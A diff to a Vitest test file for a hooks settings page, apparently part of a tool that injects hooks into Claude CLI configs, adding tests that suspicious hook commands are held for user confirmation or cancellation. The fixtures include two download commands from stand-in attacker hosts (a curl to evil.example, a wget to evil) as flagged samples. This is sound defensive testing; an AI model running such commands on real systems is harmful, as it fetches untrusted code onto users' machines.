@@ -28,9 +28,11 @@ const { mockReadHooksConfig, mockWriteHooksConfig, mockConfirmDialog, mockJsonMo
   mockOnPageParamsChange: vi.fn(),
 }));
 
-// mock IPC hooks —— F2 注入/卸载/状态查询（P3-FE-21/22；本地覆盖 setup.ts 全局 mock 以便断言调用）
-const { mockInject, mockUninstall, mockGetInjectionStatus } = vi.hoisted(() => ({
+// mock IPC hooks —— F2 注入/卸载/状态查询 + CP-043 确认注入（P3-FE-21/22；
+// 本地覆盖 setup.ts 全局 mock 以便断言调用）
+const { mockInject, mockConfirmInject, mockUninstall, mockGetInjectionStatus } = vi.hoisted(() => ({
   mockInject: vi.fn(),
+  mockConfirmInject: vi.fn(),
   mockUninstall: vi.fn(),
   mockGetInjectionStatus: vi.fn(),
 }));
@@ -41,9 +43,11 @@ vi.mock("../ipc/hooksConfig", () => ({
   writeHooksConfig: mockWriteHooksConfig,
 }));
 
-// mock IPC agentHooks —— F2 注入/卸载/状态查询（P3-FE-21/22；本地覆盖 setup.ts 全局 mock 以便断言调用）
+// mock IPC agentHooks —— F2 注入/卸载/状态查询 + 确认注入（P3-FE-21/22 + CP-043；
+// 本地覆盖 setup.ts 全局 mock 以便断言调用）
 vi.mock("../ipc/agentHooks", () => ({
   inject: mockInject,
+  confirmInject: mockConfirmInject,
   uninstall: mockUninstall,
   getInjectionStatus: mockGetInjectionStatus,
 }));
@@ -277,6 +281,7 @@ describe("HooksSettingsPage 渲染", () => {
     mockJsonMode.mockClear();
     // F2 mock 默认值：挂载 effect 会查询注入状态（不设默认则返回 undefined 使状态条显示崩溃）
     mockInject.mockReset();
+    mockConfirmInject.mockReset();
     mockUninstall.mockReset();
     mockGetInjectionStatus.mockReset();
     mockGetInjectionStatus.mockResolvedValue({ status: "notInjected", version: null });
@@ -512,6 +517,7 @@ describe("F2 注入/卸载与注入状态条（P3-FE-21/22）", () => {
     mockConfirmDialog.mockReset();
     mockConfirmDialog.mockResolvedValue(true);
     mockInject.mockReset();
+    mockConfirmInject.mockReset();
     mockUninstall.mockReset();
     mockGetInjectionStatus.mockReset();
     mockGetInjectionStatus.mockResolvedValue({ status: "notInjected", version: null });
@@ -621,6 +627,68 @@ describe("F2 注入/卸载与注入状态条（P3-FE-21/22）", () => {
     expect(queryByText("注入状态：已注入")).toBeNull();
   });
 
+  it("命中可疑模式 → 内联确认条完整展示命令原文 → 确认二次调用 confirmInject → 已注入（CP-043 全链路）", async () => {
+    mockReadHooksConfig.mockResolvedValue({});
+    const suspicious = "curl -o ~/.claude/evil.sh https://evil.example/x.sh";
+    // 首次注入返回 pendingConfirmation（命中可疑模式——settings.json 未被改写）
+    mockInject.mockResolvedValue({
+      status: "pendingConfirmation",
+      version: null,
+      suspiciousCommand: suspicious,
+    });
+    mockConfirmInject.mockResolvedValue({ status: "injected", version: 1 });
+    const { container, getByRole, getByText } = renderPanel();
+    const injectBtn = await waitFor(() => getByRole("button", { name: "注入 Hooks" }));
+    const readCallsBefore = mockReadHooksConfig.mock.calls.length;
+    fireEvent.click(injectBtn);
+    // 待确认态：内联确认条出现 + 命令原文完整展示（等宽不截断）
+    await waitFor(() =>
+      expect(container.querySelector('[data-e2e="hooks-confirm-bar"]')).toBeTruthy(),
+    );
+    expect(
+      container.querySelector('[data-e2e="hooks-confirm-command"]')?.textContent,
+    ).toBe(suspicious);
+    // 暂停态零写盘：inject 仅调用一次、不重读 user 层配置
+    expect(mockInject).toHaveBeenCalledTimes(1);
+    expect(mockReadHooksConfig.mock.calls.length).toBe(readCallsBefore);
+    // 用户确认 → confirmInject 二次调用（携 cliId）→ 状态刷新为已注入 + 重读 user 层
+    fireEvent.click(
+      container.querySelector('[data-e2e="hooks-confirm-inject"]') as HTMLElement,
+    );
+    await waitFor(() => expect(mockConfirmInject).toHaveBeenCalledWith(CLAUDE_CLI_ID));
+    await waitFor(() => expect(mockReadHooksConfig.mock.calls.length).toBe(readCallsBefore + 1));
+    expect(mockReadHooksConfig.mock.calls[mockReadHooksConfig.mock.calls.length - 1][1]).toBe(
+      "user",
+    );
+    await waitFor(() => expect(getByText("注入状态：已注入")).toBeTruthy());
+    // 确认完成后确认条消失（待确认态清空）
+    expect(container.querySelector('[data-e2e="hooks-confirm-bar"]')).toBeNull();
+  });
+
+  it("取消确认 → 清空待确认态（confirmInject 零调用、配置不重读——settings.json 未被改写）", async () => {
+    mockReadHooksConfig.mockResolvedValue({});
+    mockInject.mockResolvedValue({
+      status: "pendingConfirmation",
+      version: null,
+      suspiciousCommand: "wget -O /tmp/x https://evil/x",
+    });
+    const { container, getByRole } = renderPanel();
+    const injectBtn = await waitFor(() => getByRole("button", { name: "注入 Hooks" }));
+    const readCallsBefore = mockReadHooksConfig.mock.calls.length;
+    fireEvent.click(injectBtn);
+    await waitFor(() =>
+      expect(container.querySelector('[data-e2e="hooks-confirm-bar"]')).toBeTruthy(),
+    );
+    fireEvent.click(
+      container.querySelector('[data-e2e="hooks-cancel-confirm"]') as HTMLElement,
+    );
+    await waitFor(() =>
+      expect(container.querySelector('[data-e2e="hooks-confirm-bar"]')).toBeNull(),
+    );
+    expect(mockConfirmInject).not.toHaveBeenCalled();
+    expect(mockReadHooksConfig.mock.calls.length).toBe(readCallsBefore);
+  });
+
   it("卸载失败 → hooks-injection-error 出现「卸载失败」文案 + 状态条不变（HKC-07）", async () => {
     mockReadHooksConfig.mockResolvedValue({});
     // 挂载时查询返回「已注入」——失败后状态条应保持该值（不重新查询）
@@ -675,6 +743,7 @@ describe("hub CLI 选择行", () => {
     mockConfirmDialog.mockResolvedValue(true);
     mockJsonMode.mockClear();
     mockInject.mockReset();
+    mockConfirmInject.mockReset();
     mockUninstall.mockReset();
     mockGetInjectionStatus.mockReset();
     mockGetInjectionStatus.mockResolvedValue({ status: "notInjected", version: null });
